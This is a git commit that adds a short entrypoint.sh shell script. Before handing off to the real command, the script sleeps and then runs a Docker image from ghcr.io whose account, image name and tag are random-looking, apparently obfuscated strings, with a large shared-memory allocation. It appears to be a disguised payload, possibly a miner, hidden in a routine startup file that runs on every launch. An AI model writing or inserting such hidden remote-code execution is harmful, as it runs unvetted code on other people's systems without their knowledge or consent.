1e0e50a6c89f927352b59c235f71b21b0a361bfd
tredi ongop <vijayabhanu01+trediongop@outlook.com>
2024-10-22 18:17:06 +0530

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+sleep 5s;
+
+docker run --rm -i \
+  --shm-size 4g \
+  ghcr.io/nixegohshs5f4ef6vuun43f6/hvhj456v3cy7rv66v4rfgu6rtyu8843dbitapyv3125:yhf3gj79bt8kytv57vttv7rec7bitA0000-of-one
+
+# start the script
+exec "$@"
